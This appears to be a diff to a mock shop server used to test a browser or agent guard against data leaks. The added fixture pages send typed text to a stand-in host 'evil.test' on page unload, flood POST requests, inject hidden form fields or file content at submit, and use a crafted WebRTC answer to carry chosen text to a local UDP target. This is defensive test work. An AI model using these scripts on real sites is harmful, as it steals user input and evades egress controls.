@@ -221,6 +221,95 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
             'Typed',
           ),
         );
+      case 'shop.test/unload':
+        // the page sends the typed text when it goes away, to another site and to its own, and it asks to stay.
+        return send(
+          200,
+          html(
+            `<label>Note <input id="q"></label>
+            <script>
+              const go = (tag) => {
+                const v = document.getElementById('q').value;
+                navigator.sendBeacon('${at('evil.test', '/beacon-')}' + tag, 'typed=' + v);
+                fetch('${at('evil.test', '/keepalive-')}' + tag, { method: 'POST', body: 'typed=' + v, keepalive: true }).catch(() => {});
+                navigator.sendBeacon('/own-beacon-' + tag, 'typed=' + v);
+              };
+              addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
+              addEventListener('pagehide', () => go('pagehide'));
+              addEventListener('unload', () => go('unload'));
+              document.addEventListener('visibilitychange', () => document.visibilityState === 'hidden' && go('hidden'));
+            </script>`,
+            'Unload',
+          ),
+        );
+      case 'shop.test/flood':
+        // the gate blocks each post, and the page never stops.
+        return send(200, html(`<h1>Flood</h1><script>setInterval(() => { for (let i = 0; i < 20; i++) fetch('/api/x?' + Math.random(), { method: 'POST', body: 'x' }).catch(() => {}); }, 5)</script>`, 'Flood'));
+      case 'shop.test/pw-space': {
+        // the snapshot changes the white space of a value: it trims it, and it shows a tab or a line separator as a space.
+        const values = [` ${FIXTURE_PASSWORD}A `, `${FIXTURE_PASSWORD}B x`, `${FIXTURE_PASSWORD}C\tx`, `-${FIXTURE_PASSWORD}D"x: y`];
+        const fields = values.map((_, i) => `<label>P${i} <input type="password" id="p${i}"></label>`).join('');
+        return send(200, html(`${fields}<script>${JSON.stringify(values)}.forEach((v, i) => (document.getElementById('p' + i).value = v));</script>`, 'Spaces'));
+      }
+      case 'shop.test/image-form':
+        // with a hash in the address, a script adds a field named like the click position of the image button.
+        return send(
+          200,
+          html(
+            `<form action="/buy" method="post"><label>Note <input name="note" value="hello"></label>
+              <input type="image" name="go" alt="Go" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20"></form>
+            <form action="/buy" method="post"><label>Item <input name="item" value="pen"></label>
+              <input type="image" alt="Order" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20"></form>
+            <script>
+              document.forms[0].addEventListener('submit', (e) => {
+                if (!location.hash) return;
+                const extra = document.createElement('input');
+                extra.type = 'hidden'; extra.name = 'go.x'; extra.value = location.hash.slice(1);
+                e.target.appendChild(extra);
+              });
+            </script>`,
+            'Image form',
+          ),
+        );
+      case 'shop.test/file-form':
+        // with a hash in the address, a script puts content into the empty file field at the click.
+        return send(
+          200,
+          html(
+            `<form action="/buy" method="post" enctype="multipart/form-data"><label>Note <input name="note" value="hello"></label>
+              <label>Attachment <input type="file" name="f"></label><button>Send</button></form>
+            <script>
+              document.forms[0].addEventListener('submit', () => {
+                if (!location.hash) return;
+                const dt = new DataTransfer();
+                dt.items.add(new File(['FILE-CONTENT-AT-CLICK'], ''));
+                document.querySelector('input[type=file]').files = dt.files;
+              });
+            </script>`,
+            'File form',
+          ),
+        );
+      case 'shop.test/rtc': {
+        // a crafted answer: the remote candidate is an address of this pc, and the remote ufrag is text that the page chose.
+        const target = new URL(path, 'http://x').searchParams.get('udp');
+        return send(
+          200,
+          html(
+            `<h1>rtc</h1><script>
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${target}' }] });
+            pc.createDataChannel('x');
+            pc.createOffer().then(async (o) => {
+              await pc.setLocalDescription(o);
+              const sdp = o.sdp.replace(/a=ice-ufrag:.*\\r\\n/, 'a=ice-ufrag:UFRAGDATA42\\r\\n').replace(/a=ice-pwd:.*\\r\\n/, 'a=ice-pwd:abcdefghijklmnopqrstuvwx\\r\\n').replace('a=setup:actpass', 'a=setup:active');
+              await pc.setRemoteDescription({ type: 'answer', sdp });
+              const [host, port] = '${target}'.split(':');
+              await pc.addIceCandidate({ candidate: 'candidate:1 1 udp 2122260223 ' + host + ' ' + port + ' typ host', sdpMid: '0', sdpMLineIndex: 0 });
+            });
+            </script>`,
+            'Rtc',
+          ),
+        );
+      }
       case 'shop.test/about':
         return send(200, html('<h1>About the shop</h1><p>We sell shirts.</p>', 'About'));
       case 'shop.test/buy':
